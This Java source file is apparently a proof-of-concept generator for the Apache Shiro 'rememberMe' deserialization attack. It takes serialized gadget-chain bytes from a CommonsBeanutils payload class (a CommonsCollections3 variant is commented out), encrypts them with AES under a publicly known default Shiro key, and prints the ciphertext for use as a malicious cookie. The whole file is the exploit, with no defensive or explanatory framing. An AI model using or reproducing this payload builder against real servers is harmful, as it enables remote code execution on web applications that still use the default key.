import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class POC {
    public static void main(String[] args) throws Exception {
//        CommonsCollections3 cc3 = new CommonsCollections3();
//        byte[] temp = cc3.getPOCBytes();

        CommonsBeanutilsPoc commonsBeanutilsPoc = new CommonsBeanutilsPoc();
        byte[] temp = commonsBeanutilsPoc.getPOCBytes();

        AesCipherService aesCipherService = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
        // byte[] key = Base64.decode(CodecSupport.toBytes("U3ByaW5nQmxhZGUAAAAAAA=="));

        ByteSource ciphertext = aesCipherService.encrypt(temp, key);
        aesCipherService.decrypt(ciphertext.getBytes(), key);
        System.out.println(ciphertext.toString());
    }
}
